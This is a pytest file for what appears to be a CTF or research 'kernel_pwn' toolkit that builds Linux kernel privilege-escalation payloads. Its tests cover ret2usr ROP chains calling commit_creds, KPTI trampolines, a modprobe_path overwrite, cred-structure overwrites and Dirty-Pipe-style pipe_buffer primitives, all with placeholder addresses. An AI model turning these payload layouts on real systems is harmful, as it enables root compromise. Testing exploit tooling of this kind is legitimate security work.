"""Deterministic tests for the r5b Linux kernel payload templates."""
from __future__ import annotations

import struct
import sys
from pathlib import Path

import pytest


REPO = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))

from contract import PayloadBuild  # noqa: E402
import kernel_pwn as kernel  # noqa: E402


KBASE = 0xFFFFFFFF81000000


def qword(payload: bytes, offset: int) -> int:
    return struct.unpack_from("<Q", payload, offset)[0]


def assert_contract(result: PayloadBuild) -> None:
    payload, placements = result
    assert payload == result.payload
    assert placements == result.placements
    assert result.architecture == "linux-kernel-x86_64"
    assert all(0 <= offset <= len(payload) for offset in placements.values())


def test_kaslr_rebase_is_sorted_deterministic_and_round_trips_qwords():
    result = kernel.build_kaslr_rebase(
        leaked_address=KBASE + 0x123450,
        leaked_symbol_offset=0x123450,
        symbol_offsets={"prepare_kernel_cred": 0x90200, "commit_creds": 0x90000},
    )
    assert_contract(result)
    assert result.strategy == "kaslr-rebase-table"
    assert list(result.placements) == ["kernel_base", "symbol.commit_creds", "symbol.prepare_kernel_cred"]
    assert qword(result.payload, result.placements["kernel_base"]) == KBASE
    assert qword(result.payload, result.placements["symbol.commit_creds"]) == KBASE + 0x90000
    assert qword(result.payload, result.placements["symbol.prepare_kernel_cred"]) == KBASE + 0x90200
    second = kernel.build_kaslr_rebase(
        leaked_address=KBASE + 0x123450,
        leaked_symbol_offset=0x123450,
        symbol_offsets={"commit_creds": 0x90000, "prepare_kernel_cred": 0x90200},
    )
    assert second.payload == result.payload
    with pytest.raises(kernel.KernelBuildError, match="alignment"):
        kernel.build_kaslr_rebase(
            leaked_address=KBASE + 0x123451, leaked_symbol_offset=0x123450,
            symbol_offsets={"x": 1},
        )


def test_pt_regs_frame_uses_linux_entry_order_and_rejects_unknown_fields():
    prefix = b"R5B-KERNEL-MARKER"
    result = kernel.build_pt_regs_frame(
        {"rip": 0x401234, "cs": 0x33, "eflags": 0x246, "rsp": 0x7FFFFFFFE000, "ss": 0x2B},
        prefix=prefix,
    )
    assert_contract(result)
    assert result.payload.startswith(prefix)
    assert result.placements["pt_regs"] == len(prefix)
    assert result.placements["pt_regs.rip"] == len(prefix) + 16 * 8
    assert qword(result.payload, result.placements["pt_regs.rip"]) == 0x401234
    assert qword(result.payload, result.placements["pt_regs.r15"]) == 0
    assert len(result.payload) == len(prefix) + len(kernel.PT_REGS_X86_64) * 8
    with pytest.raises(kernel.KernelBuildError, match="unknown pt_regs"):
        kernel.build_pt_regs_frame({"not_a_register": 1})


def test_ret2usr_prepare_commit_and_direct_iretq_layout():
    result = kernel.build_ret2usr(
        padding=b"P" * 16,
        pop_rdi_ret=KBASE + 0x100,
        prepare_kernel_cred=KBASE + 0x200,
        mov_rdi_rax_ret=KBASE + 0x300,
        commit_creds=KBASE + 0x400,
        swapgs_ret=KBASE + 0x500,
        iretq=KBASE + 0x600,
        user_rip=0x401000, user_cs=0x33, user_rflags=0x246,
        user_rsp=0x7FFFFFFFD000, user_ss=0x2B,
    )
    assert_contract(result)
    assert result.payload[:16] == b"P" * 16
    assert result.metadata["credential_mode"] == "prepare-commit"
    assert result.metadata["return_mode"] == "swapgs-iretq"
    expected = [
        KBASE + 0x100, 0, KBASE + 0x200, KBASE + 0x300, KBASE + 0x400,
        KBASE + 0x500, 0, KBASE + 0x600,
        0x401000, 0x33, 0x246, 0x7FFFFFFFD000, 0x2B,
    ]
    assert [qword(result.payload, 16 + i * 8) for i in range(len(expected))] == expected


def test_ret2usr_init_cred_kpti_variant_and_ambiguous_routes_refuse():
    result = kernel.build_ret2usr(
        pop_rdi_ret=KBASE + 0x10, init_cred=KBASE + 0x200000,
        commit_creds=KBASE + 0x20, trampoline=KBASE + 0x800,
        trampoline_padding_qwords=3,
        user_rip=0x400123, user_cs=0x33, user_rflags=0x202,
        user_rsp=0x7FFF0000, user_ss=0x2B,
    )
    assert_contract(result)
    assert result.metadata["credential_mode"] == "commit-init-cred"
    assert result.metadata["return_mode"] == "kpti-trampoline"
    assert all(qword(result.payload, result.placements[f"return.trampoline_pad.{i}"]) == 0
               for i in range(3))
    with pytest.raises(kernel.KernelBuildError, match="exactly one credential"):
        kernel.build_ret2usr(
            pop_rdi_ret=KBASE + 1, init_cred=KBASE + 2,
            prepare_kernel_cred=KBASE + 3, mov_rdi_rax_ret=KBASE + 4,
            commit_creds=KBASE + 5, trampoline=KBASE + 6,
            user_rip=1, user_cs=2, user_rflags=3, user_rsp=4, user_ss=5,
        )
    with pytest.raises(kernel.KernelBuildError, match="choose trampoline"):
        kernel.build_ret2usr(
            pop_rdi_ret=KBASE + 1, init_cred=KBASE + 2, commit_creds=KBASE + 3,
            trampoline=KBASE + 4, swapgs_ret=KBASE + 5, iretq=KBASE + 6,
            user_rip=1, user_cs=2, user_rflags=3, user_rsp=4, user_ss=5,
        )


def test_modprobe_path_overwrite_chunks_and_targets_reconstruct_path():
    address = 0xFFFFFFFF8245A5A0
    result = kernel.build_modprobe_path_overwrite(
        modprobe_path_address=address,
        replacement_path="/tmp/r5b_helper",
        pop_address_ret=KBASE + 0x111,
        pop_value_ret=KBASE + 0x222,
        write_qword_gadget=KBASE + 0x333,
        padding=b"R5B",
    )
    assert_contract(result)
    chunks = bytearray()
    for index in range(int(result.metadata["write_count"])):
        label = f"write.{index}"
        chunks.extend(struct.pack("<Q", qword(result.payload, result.placements[f"{label}.value"])))
        assert qword(result.payload, result.placements[f"{label}.target"]) == address + index * 8
        assert result.targets[label] == address + index * 8
    assert bytes(chunks).startswith(b"/tmp/r5b_helper\x00")
    with pytest.raises(kernel.KernelBuildError, match="absolute"):
        kernel.build_modprobe_path_overwrite(
            modprobe_path_address=address, replacement_path="relative",
            pop_address_ret=KBASE + 1, pop_value_ret=KBASE + 2,
            write_qword_gadget=KBASE + 3,
        )


def test_cred_overwrite_has_width_correct_values_and_custom_layout_guards():
    cred = 0xFFFF888012340000
    result = kernel.build_cred_overwrite(
        cred_address=cred,
        pop_address_ret=KBASE + 0x10,
        pop_value_ret=KBASE + 0x20,
        write_dword_gadget=KBASE + 0x30,
        write_qword_gadget=KBASE + 0x40,
        field_values={"uid": 1000, "cap_effective": 0x1234},
    )
    assert_contract(result)
    assert qword(result.payload, result.placements["cred.uid.value"]) == 1000
    assert qword(result.payload, result.placements["cred.uid.store"]) == KBASE + 0x30
    assert qword(result.payload, result.placements["cred.cap_effective.value"]) == 0x1234
    assert qword(result.payload, result.placements["cred.cap_effective.store"]) == KBASE + 0x40
    assert result.targets["cred.uid"] == cred + 0x04
    assert qword(result.payload, result.placements["cred.cap_permitted.value"]) == (1 << 64) - 1
    with pytest.raises(kernel.KernelBuildError, match="overlaps"):
        kernel.build_cred_overwrite(
            cred_address=cred, pop_address_ret=KBASE + 1, pop_value_ret=KBASE + 2,
            write_dword_gadget=KBASE + 3, write_qword_gadget=KBASE + 4,
            field_layout=(("one", 0, 8), ("two", 4, 4)),
        )


def test_pipe_buffer_exact_layout_and_merge_flag():
    result = kernel.build_pipe_buffer(
        page=0xFFFFEA0001234000, offset=0x120, length=0x80,
        ops=KBASE + 0x123000, flags=kernel.PIPE_BUF_FLAG_CAN_MERGE,
        private=0xAABBCCDDEEFF0011, prefix=b"R5B!",
    )
    assert_contract(result)
    p = result.placements
    assert p["pipe_buffer"] == 4
    assert qword(result.payload, p["pipe_buffer.page"]) == 0xFFFFEA0001234000
    assert struct.unpack_from("<I", result.payload, p["pipe_buffer.offset"])[0] == 0x120
    assert struct.unpack_from("<I", result.payload, p["pipe_buffer.length"])[0] == 0x80
    assert qword(result.payload, p["pipe_buffer.ops"]) == KBASE + 0x123000
    assert struct.unpack_from("<I", result.payload, p["pipe_buffer.flags"])[0] == 0x10
    assert result.payload[p["pipe_buffer.alignment"]:p["pipe_buffer.alignment"] + 4] == b"\x00" * 4
    assert qword(result.payload, p["pipe_buffer.private"]) == 0xAABBCCDDEEFF0011
    assert len(result.payload) == 4 + 40


def test_pipe_page_cache_primitive_places_marker_and_enforces_page_rules():
    marker = b"R5B_PIPE_MARKER"
    result = kernel.build_pipe_page_cache_primitive(
        page=0xFFFFEA0001234000, pipe_buf_ops=KBASE + 0x123000,
        file_offset=0x2201, replacement=marker,
    )
    assert_contract(result)
    assert result.payload[result.placements["replacement"]:] == marker
    assert result.targets["page_cache.file_offset"] == 0x2201
    flags = struct.unpack_from("<I", result.payload, result.placements["pipe_buffer.flags"])[0]
    assert flags & kernel.PIPE_BUF_FLAG_CAN_MERGE
    with pytest.raises(kernel.KernelBuildError, match="page boundary"):
        kernel.build_pipe_page_cache_primitive(
            page=0xFFFFEA0001234000, pipe_buf_ops=KBASE + 1,
            file_offset=0x2000, replacement=b"x",
        )
    with pytest.raises(kernel.KernelBuildError, match="crosses"):
        kernel.build_pipe_page_cache_primitive(
            page=0xFFFFEA0001234000, pipe_buf_ops=KBASE + 1,
            file_offset=0x2FFF, replacement=b"xx",
        )


def test_kernel_results_are_immutable_and_json_friendly():
    result = kernel.build_pt_regs_frame({"rip": 1})
    with pytest.raises(TypeError):
        result.placements["pt_regs.rip"] = 9
    rendered = result.as_dict()
    assert rendered["payload_hex"] == result.payload.hex()
    assert rendered["architecture"] == "linux-kernel-x86_64"

